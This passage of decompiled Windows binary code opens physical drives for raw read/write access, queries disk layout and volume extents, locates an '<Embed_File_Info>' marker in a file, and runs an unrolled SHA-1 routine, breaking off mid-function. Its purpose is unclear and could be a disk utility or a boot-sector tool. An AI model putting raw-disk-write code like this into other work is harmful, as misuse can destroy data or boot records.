  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_8 = (HANDLE)0xffffffff;
  puVar2 = (undefined4 *)u_____PHYSICALDRIVE_004273ec;
  puVar3 = local_34;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_10 = 0;
  local_48 = L'\0';
  local_46 = 0;
  local_42 = 0;
  local_3e = 0;
  local_3a = 0;
  local_36 = 0;
  if (-1 < param_1) {
    FUN_00405270(param_1,&local_48,10);
    _wcscat_s((wchar_t *)local_34,0x14,&local_48);
    if ((DAT_0042b064 == 0) || (param_1 != 0)) {
      local_8 = CreateFileW((LPCWSTR)local_34,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                            (HANDLE)0x0);
    }
    else if (DAT_0042b064 == 1) {
      local_8 = CreateFileW((LPCWSTR)local_34,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                            (HANDLE)0x0);
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00404fe0(short param_1,undefined4 *param_2)

{
  BOOL BVar1;
  undefined8 uVar2;
  undefined local_44c [1028];
  DWORD local_48;
  HANDLE local_44;
  undefined4 local_40;
  undefined *local_3c;
  wchar_t local_38;
  undefined4 local_36;
  undefined4 local_32;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined2 local_12;
  undefined4 local_10;
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_40 = 0;
  local_c = DAT_004274e8;
  local_38 = L'\0';
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_44 = (HANDLE)0x0;
  local_3c = local_44c;
  local_10._0_2_ = (short)DAT_004274e4;
  local_10 = CONCAT22((short)((uint)DAT_004274e4 >> 0x10),(short)local_10 + param_1);
  FUN_00405290(&local_38,u______s_004274ec);
  local_44 = CreateFileW(&local_38,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if ((local_44 != (HANDLE)0xffffffff) &&
     (BVar1 = DeviceIoControl(local_44,0x560000,(LPVOID)0x0,0,local_3c,0x400,&local_48,
                              (LPOVERLAPPED)0x0), BVar1 != 0)) {
    uVar2 = __alldiv(*(uint *)(local_3c + 8),*(uint *)(local_3c + 0xc),0x200,0);
    local_40 = (undefined4)uVar2;
    *param_2 = *(undefined4 *)(local_3c + 4);
  }
  if (local_44 != (HANDLE)0x0) {
    CloseHandle(local_44);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00405100(HANDLE param_1)

{
  int iVar1;
  BOOL BVar2;
  undefined8 uVar3;
  void *local_28;
  uint local_24;
  int local_20;
  DWORD local_1c;
  undefined4 local_18;
  uint local_14;
  int local_10;
  DWORD local_c;
  int local_8;
  
  Sleep(100);
  local_18 = 0;
  local_28 = (void *)0x0;
  local_8 = 0;
  local_14 = 0;
  local_10 = 0;
  local_24 = 0;
  local_20 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    local_c = 0xb69;
    local_28 = operator_new(0xb69);
    BVar2 = DeviceIoControl(param_1,0x70050,(LPVOID)0x0,0,local_28,local_c,&local_1c,
                            (LPOVERLAPPED)0x0);
    if (BVar2 != 0) {
      for (local_8 = 0; local_8 < 4; local_8 = local_8 + 1) {
        iVar1 = *(int *)((int)local_28 + local_8 * 0x89 + 0x34);
        if ((local_10 <= iVar1) &&
           ((local_10 < iVar1 || (local_14 < *(uint *)((int)local_28 + local_8 * 0x89 + 0x30))))) {
          local_14 = *(uint *)((int)local_28 + local_8 * 0x89 + 0x30);
          local_10 = *(int *)((int)local_28 + local_8 * 0x89 + 0x34);
          local_24 = *(uint *)((int)local_28 + local_8 * 0x89 + 0x38);
          local_20 = *(int *)((int)local_28 + local_8 * 0x89 + 0x3c);
        }
      }
      uVar3 = __alldiv(local_14 + local_24,local_10 + local_20 + (uint)CARRY4(local_14,local_24),
                       0x200,0);
      local_18 = (undefined4)uVar3;
    }
  }
  if (local_28 != (void *)0x0) {
    FUN_00410837(local_28);
  }
  Sleep(100);
  return local_18;
}



void __cdecl FUN_00405270(int param_1,wchar_t *param_2,int param_3)

{
  __itow_s(param_1,param_2,10,param_3);
  return;
}



void __cdecl FUN_00405290(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x14,param_2,&stack0x0000000c);
  return;
}



undefined4 __cdecl
FUN_004052c0(LPCWSTR param_1,short *param_2,void *param_3,size_t param_4,DWORD *param_5)

{
  short sVar1;
  void *pvVar2;
  undefined4 uVar3;
  uint uVar4;
  short *local_1c;
  
  local_1c = param_2;
  do {
    sVar1 = *local_1c;
    local_1c = local_1c + 1;
  } while (sVar1 != 0);
  uVar4 = (int)local_1c - (int)(param_2 + 1) >> 1;
  pvVar2 = operator_new(uVar4 + 1);
  uVar3 = FUN_00405350(param_1,s_<Embed_File_Info>_004271e8,uVar4,param_3,param_4,param_5);
  FUN_00410837(pvVar2);
  return uVar3;
}



undefined4 __cdecl
FUN_00405350(LPCWSTR param_1,char *param_2,uint param_3,void *param_4,size_t param_5,DWORD *param_6)

{
  bool bVar1;
  uint local_2c;
  DWORD local_28;
  DWORD local_1c;
  undefined4 local_18;
  void *local_14;
  HANDLE local_10;
  DWORD local_c;
  DWORD local_8;
  
  local_18 = 0;
  local_10 = (HANDLE)0x0;
  local_10 = CreateFileW(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  GetLastError();
  if (local_10 == (HANDLE)0xffffffff) {
    local_18 = 0;
  }
  else {
    local_8 = GetFileSize(local_10,&local_c);
    if (local_8 == 0) {
      CloseHandle(local_10);
      local_18 = 0;
    }
    else {
      local_14 = operator_new(local_8);
      ReadFile(local_10,local_14,local_8,&local_1c,(LPOVERLAPPED)0x0);
      CloseHandle(local_10);
      local_28 = local_8;
      if (local_1c == local_8) {
        do {
          do {
            local_28 = local_28 - 1;
          } while (*(char *)((int)local_14 + local_28) != *param_2);
          bVar1 = true;
          for (local_2c = 1; local_2c < param_3; local_2c = local_2c + 1) {
            if (*(char *)((int)local_14 + local_28 + local_2c) != param_2[local_2c]) {
              bVar1 = false;
              break;
            }
          }
        } while (!bVar1);
        if (bVar1) {
          _memcpy(param_4,(void *)((int)local_14 + local_28),param_5);
          *param_6 = local_28;
          local_18 = 1;
        }
        FUN_00410837(local_14);
      }
      else {
        FUN_00410837(local_14);
        local_18 = 0;
      }
    }
  }
  return local_18;
}



undefined4 __cdecl FUN_004054f0(HANDLE param_1,undefined4 *param_2)

{
  short sVar1;
  uint uVar2;
  BOOL BVar3;
  int iVar4;
  undefined4 *puVar5;
  short *local_34;
  short *local_24;
  undefined4 *local_c;
  undefined4 local_8;
  
  local_8 = 0;
  local_c = (undefined4 *)0x0;
  if (param_1 != (HANDLE)0xffffffff) {
    local_c = (undefined4 *)operator_new(0x400);
    _memset(local_c,0,0x400);
    uVar2 = FUN_00405100(param_1);
    BVar3 = FUN_00404e70(param_1,uVar2,2,local_c);
    if (BVar3 != 0) {
      if (local_c[1] == DAT_00427188) {
        local_24 = (short *)((int)local_c + 0x10e);
        do {
          sVar1 = *local_24;
          local_24 = local_24 + 1;
        } while (sVar1 != 0);
        if ((int)local_24 - (int)(local_c + 0x44) >> 1 != 0) {
          local_8 = 1;
          puVar5 = local_c;
          for (iVar4 = 0x8d; iVar4 != 0; iVar4 = iVar4 + -1) {
            *param_2 = *puVar5;
            puVar5 = puVar5 + 1;
            param_2 = param_2 + 1;
          }
          *(undefined2 *)param_2 = *(undefined2 *)puVar5;
          goto LAB_00405676;
        }
      }
      BVar3 = FUN_00404e70(param_1,0x1e,2,local_c);
      if ((BVar3 != 0) && (local_c[1] == DAT_00427190)) {
        local_34 = (short *)((int)local_c + 0x10e);
        do {
          sVar1 = *local_34;
          local_34 = local_34 + 1;
        } while (sVar1 != 0);
        if ((int)local_34 - (int)(local_c + 0x44) >> 1 != 0) {
          local_8 = 1;
          puVar5 = local_c;
          for (iVar4 = 0x8d; iVar4 != 0; iVar4 = iVar4 + -1) {
            *param_2 = *puVar5;
            puVar5 = puVar5 + 1;
            param_2 = param_2 + 1;
          }
          *(undefined2 *)param_2 = *(undefined2 *)puVar5;
        }
      }
    }
  }
LAB_00405676:
  if (local_c != (undefined4 *)0x0) {
    FUN_00410837(local_c);
  }
  return local_8;
}



void __cdecl FUN_004056a0(undefined4 *param_1)

{
  int local_220;
  int local_21c;
  HANDLE local_218;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_21c = 0;
  local_220 = 0;
  local_218 = (HANDLE)0xffffffff;
  GetSystemDirectoryW(&local_214,0x104);
  local_21c = (ushort)local_214 - 0x41;
  FUN_00404fe0((short)local_21c,&local_220);
  local_218 = (HANDLE)FUN_00404f00(local_220);
  if (local_218 != (HANDLE)0xffffffff) {
    FUN_004054f0(local_218,param_1);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00405770(int param_1)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  
  puVar1 = (uint *)(param_1 + 0x1c);
  uVar2 = *(uint *)(param_1 + 8);
  uVar4 = *(uint *)(param_1 + 0xc);
  uVar3 = *(uint *)(param_1 + 0x10);
  uVar7 = *(uint *)(param_1 + 0x14);
  uVar5 = (uVar2 >> 0x1b | uVar2 << 5) + ((uVar3 ^ uVar7) & uVar4 ^ uVar7) + 0x5a827999 + *puVar1 +
          *(int *)(param_1 + 0x18);
  uVar6 = uVar4 >> 2 | uVar4 << 0x1e;
  uVar7 = (uVar5 >> 0x1b | uVar5 * 0x20) + ((uVar6 ^ uVar3) & uVar2 ^ uVar3) + 0x5a827999 +
          *(int *)(param_1 + 0x20) + uVar7;
  uVar2 = uVar2 >> 2 | uVar2 << 0x1e;
  uVar3 = (uVar7 >> 0x1b | uVar7 * 0x20) + ((uVar2 ^ uVar6) & uVar5 ^ uVar6) + 0x5a827999 +
          *(int *)(param_1 + 0x24) + uVar3;
  uVar5 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar6 = (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar5 ^ uVar2) & uVar7 ^ uVar2) + 0x5a827999 +
          *(int *)(param_1 + 0x28) + uVar6;
  uVar7 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar2 = (uVar6 >> 0x1b | uVar6 * 0x20) + ((uVar7 ^ uVar5) & uVar3 ^ uVar5) + 0x5a827999 +
          *(int *)(param_1 + 0x2c) + uVar2;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar5 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar4 ^ uVar7) & uVar6 ^ uVar7) + 0x5a827999 +
          *(int *)(param_1 + 0x30) + uVar5;
  uVar3 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar7 = (uVar5 >> 0x1b | uVar5 * 0x20) + ((uVar3 ^ uVar4) & uVar2 ^ uVar4) + 0x5a827999 +
          *(int *)(param_1 + 0x34) + uVar7;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = (uVar7 >> 0x1b | uVar7 * 0x20) + ((uVar6 ^ uVar3) & uVar5 ^ uVar3) + 0x5a827999 +
          *(int *)(param_1 + 0x38) + uVar4;
  uVar2 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = (uVar4 >> 0x1b | uVar4 * 0x20) + ((uVar2 ^ uVar6) & uVar7 ^ uVar6) + 0x5a827999 +
          *(int *)(param_1 + 0x3c) + uVar3;
  uVar7 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar6 = (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar2) & uVar4 ^ uVar2) + 0x5a827999 +
          *(int *)(param_1 + 0x40) + uVar6;
  uVar5 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar2 = (uVar6 >> 0x1b | uVar6 * 0x20) + ((uVar5 ^ uVar7) & uVar3 ^ uVar7) + 0x5a827999 +
          *(int *)(param_1 + 0x44) + uVar2;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar4 ^ uVar5) & uVar6 ^ uVar5) + 0x5a827999 +
          *(int *)(param_1 + 0x48) + uVar7;
  uVar3 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar5 = (uVar7 >> 0x1b | uVar7 * 0x20) + ((uVar3 ^ uVar4) & uVar2 ^ uVar4) + 0x5a827999 +
          *(int *)(param_1 + 0x4c) + uVar5;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = (uVar5 >> 0x1b | uVar5 * 0x20) + ((uVar6 ^ uVar3) & uVar7 ^ uVar3) + 0x5a827999 +
          *(int *)(param_1 + 0x50) + uVar4;
  uVar2 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = (uVar4 >> 0x1b | uVar4 * 0x20) + ((uVar2 ^ uVar6) & uVar5 ^ uVar6) + 0x5a827999 +
          *(int *)(param_1 + 0x54) + uVar3;
  uVar7 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar6 = (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar2) & uVar4 ^ uVar2) + 0x5a827999 +
          *(int *)(param_1 + 0x58) + uVar6;
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x50) ^ *(uint *)(param_1 + 0x3c) ^ *(uint *)(param_1 + 0x24) ^
          *puVar1;
  *puVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar6 >> 0x1b | uVar6 * 0x20) + ((uVar8 ^ uVar7) & uVar3 ^ uVar7) + 0x5a827999 + *puVar1
          + uVar2;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x54) ^ *(uint *)(param_1 + 0x40) ^ *(uint *)(param_1 + 0x28) ^
          *(uint *)(param_1 + 0x20);
  *(uint *)(param_1 + 0x20) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar4 ^ uVar8) & uVar6 ^ uVar8) + 0x5a827999 +
          *(int *)(param_1 + 0x20) + uVar7;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x58) ^ *(uint *)(param_1 + 0x44) ^ *(uint *)(param_1 + 0x2c) ^
          *(uint *)(param_1 + 0x24);
  *(uint *)(param_1 + 0x24) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar8 = (uVar7 >> 0x1b | uVar7 * 0x20) + ((uVar5 ^ uVar4) & uVar2 ^ uVar4) + 0x5a827999 +
          *(int *)(param_1 + 0x24) + uVar8;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *puVar1 ^ *(uint *)(param_1 + 0x48) ^ *(uint *)(param_1 + 0x30) ^
          *(uint *)(param_1 + 0x28);
  *(uint *)(param_1 + 0x28) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar8 >> 0x1b | uVar8 * 0x20) + ((uVar6 ^ uVar5) & uVar7 ^ uVar5) + 0x5a827999 +
          *(int *)(param_1 + 0x28) + uVar4;
  uVar2 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x20) ^ *(uint *)(param_1 + 0x4c) ^ *(uint *)(param_1 + 0x34) ^
          *(uint *)(param_1 + 0x2c);
  *(uint *)(param_1 + 0x2c) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar8 ^ uVar2 ^ uVar6) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x2c) + uVar5;
  uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x24) ^ *(uint *)(param_1 + 0x50) ^ *(uint *)(param_1 + 0x38) ^
          *(uint *)(param_1 + 0x30);
  *(uint *)(param_1 + 0x30) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar6 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar4 ^ uVar7 ^ uVar2) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x30) + uVar6;
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x28) ^ *(uint *)(param_1 + 0x54) ^ *(uint *)(param_1 + 0x3c) ^
          *(uint *)(param_1 + 0x34);
  *(uint *)(param_1 + 0x34) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar5 ^ uVar8 ^ uVar7) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x34) + uVar2;
  uVar4 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x2c) ^ *(uint *)(param_1 + 0x58) ^ *(uint *)(param_1 + 0x40) ^
          *(uint *)(param_1 + 0x38);
  *(uint *)(param_1 + 0x38) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar6 ^ uVar4 ^ uVar8) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x38) + uVar7;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x30) ^ *puVar1 ^ *(uint *)(param_1 + 0x44) ^
          *(uint *)(param_1 + 0x3c);
  *(uint *)(param_1 + 0x3c) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar8 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar2 ^ uVar5 ^ uVar4) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x3c) + uVar8;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x34) ^ *(uint *)(param_1 + 0x20) ^ *(uint *)(param_1 + 0x48) ^
          *(uint *)(param_1 + 0x40);
  *(uint *)(param_1 + 0x40) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar7 ^ uVar6 ^ uVar5) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x40) + uVar4;
  uVar2 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x38) ^ *(uint *)(param_1 + 0x24) ^ *(uint *)(param_1 + 0x4c) ^
          *(uint *)(param_1 + 0x44);
  *(uint *)(param_1 + 0x44) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar8 ^ uVar2 ^ uVar6) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x44) + uVar5;
  uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x3c) ^ *(uint *)(param_1 + 0x28) ^ *(uint *)(param_1 + 0x50) ^
          *(uint *)(param_1 + 0x48);
  *(uint *)(param_1 + 0x48) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar6 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar4 ^ uVar7 ^ uVar2) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x48) + uVar6;
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x40) ^ *(uint *)(param_1 + 0x2c) ^ *(uint *)(param_1 + 0x54) ^
          *(uint *)(param_1 + 0x4c);
  *(uint *)(param_1 + 0x4c) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar5 ^ uVar8 ^ uVar7) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x4c) + uVar2;
  uVar4 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x44) ^ *(uint *)(param_1 + 0x30) ^ *(uint *)(param_1 + 0x58) ^
          *(uint *)(param_1 + 0x50);
  *(uint *)(param_1 + 0x50) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar6 ^ uVar4 ^ uVar8) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x50) + uVar7;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x48) ^ *(uint *)(param_1 + 0x34) ^ *puVar1 ^
          *(uint *)(param_1 + 0x54);
  *(uint *)(param_1 + 0x54) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar8 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar2 ^ uVar5 ^ uVar4) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x54) + uVar8;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x4c) ^ *(uint *)(param_1 + 0x38) ^ *(uint *)(param_1 + 0x20) ^
          *(uint *)(param_1 + 0x58);
  *(uint *)(param_1 + 0x58) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar7 ^ uVar6 ^ uVar5) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x58) + uVar4;
  uVar2 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x50) ^ *(uint *)(param_1 + 0x3c) ^ *(uint *)(param_1 + 0x24) ^
          *puVar1;
  *puVar1 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar8 ^ uVar2 ^ uVar6) + 0x6ed9eba1 + *puVar1 + uVar5;
  uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x54) ^ *(uint *)(param_1 + 0x40) ^ *(uint *)(param_1 + 0x28) ^
          *(uint *)(param_1 + 0x20);
  *(uint *)(param_1 + 0x20) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar6 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar4 ^ uVar7 ^ uVar2) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x20) + uVar6;
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x58) ^ *(uint *)(param_1 + 0x44) ^ *(uint *)(param_1 + 0x2c) ^
          *(uint *)(param_1 + 0x24);
  *(uint *)(param_1 + 0x24) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar5 ^ uVar8 ^ uVar7) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x24) + uVar2;
  uVar4 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *puVar1 ^ *(uint *)(param_1 + 0x48) ^ *(uint *)(param_1 + 0x30) ^
          *(uint *)(param_1 + 0x28);
  *(uint *)(param_1 + 0x28) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar6 ^ uVar4 ^ uVar8) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x28) + uVar7;
  uVar3 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar5 = *(uint *)(param_1 + 0x20) ^ *(uint *)(param_1 + 0x4c) ^ *(uint *)(param_1 + 0x34) ^
          *(uint *)(param_1 + 0x2c);
  *(uint *)(param_1 + 0x2c) = uVar5 << 1 | (uint)((int)uVar5 < 0);
  uVar8 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar2 ^ uVar3 ^ uVar4) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x2c) + uVar8;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x24) ^ *(uint *)(param_1 + 0x50) ^ *(uint *)(param_1 + 0x38) ^
          *(uint *)(param_1 + 0x30);
  *(uint *)(param_1 + 0x30) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar7 ^ uVar6 ^ uVar3) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x30) + uVar4;
  uVar7 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x28) ^ *(uint *)(param_1 + 0x54) ^ *(uint *)(param_1 + 0x3c) ^
          *(uint *)(param_1 + 0x34);
  *(uint *)(param_1 + 0x34) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar3 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar8 ^ uVar7 ^ uVar6) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x34) + uVar3;
  uVar5 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x2c) ^ *(uint *)(param_1 + 0x58) ^ *(uint *)(param_1 + 0x40) ^
          *(uint *)(param_1 + 0x38);
  *(uint *)(param_1 + 0x38) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar6 = (uVar3 >> 0x1b | uVar3 * 0x20) + (uVar4 ^ uVar5 ^ uVar7) + 0x6ed9eba1 +
          *(int *)(param_1 + 0x38) + uVar6;
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x30) ^ *puVar1 ^ *(uint *)(param_1 + 0x44) ^
          *(uint *)(param_1 + 0x3c);
  *(uint *)(param_1 + 0x3c) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar7 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar3 & uVar8 | (uVar3 ^ uVar8) & uVar5) + -0x70e44324 +
          *(int *)(param_1 + 0x3c) + uVar7;
  uVar3 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x34) ^ *(uint *)(param_1 + 0x20) ^ *(uint *)(param_1 + 0x48) ^
          *(uint *)(param_1 + 0x40);
  *(uint *)(param_1 + 0x40) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar5 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar6 & uVar3 | (uVar6 ^ uVar3) & uVar8) + -0x70e44324 +
          *(int *)(param_1 + 0x40) + uVar5;
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x38) ^ *(uint *)(param_1 + 0x24) ^ *(uint *)(param_1 + 0x4c) ^
          *(uint *)(param_1 + 0x44);
  *(uint *)(param_1 + 0x44) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar8 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar7 & uVar2 | (uVar7 ^ uVar2) & uVar3) + -0x70e44324 +
          *(int *)(param_1 + 0x44) + uVar8;
  uVar6 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x3c) ^ *(uint *)(param_1 + 0x28) ^ *(uint *)(param_1 + 0x50) ^
          *(uint *)(param_1 + 0x48);
  *(uint *)(param_1 + 0x48) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar3 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar5 & uVar6 | (uVar5 ^ uVar6) & uVar2) + -0x70e44324 +
          *(int *)(param_1 + 0x48) + uVar3;
  uVar5 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x40) ^ *(uint *)(param_1 + 0x2c) ^ *(uint *)(param_1 + 0x54) ^
          *(uint *)(param_1 + 0x4c);
  *(uint *)(param_1 + 0x4c) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + (uVar8 & uVar5 | (uVar8 ^ uVar5) & uVar6) + -0x70e44324 +
          *(int *)(param_1 + 0x4c) + uVar2;
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar7 = *(uint *)(param_1 + 0x44) ^ *(uint *)(param_1 + 0x30) ^ *(uint *)(param_1 + 0x58) ^
          *(uint *)(param_1 + 0x50);
  *(uint *)(param_1 + 0x50) = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar6 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar3 & uVar4 | (uVar3 ^ uVar4) & uVar5) + -0x70e44324 +
          *(int *)(param_1 + 0x50) + uVar6;
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x48) ^ *(uint *)(param_1 + 0x34) ^ *puVar1 ^
          *(uint *)(param_1 + 0x54);
  *(uint *)(param_1 + 0x54) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar2 & uVar8 | (uVar2 ^ uVar8) & uVar4) + -0x70e44324 +
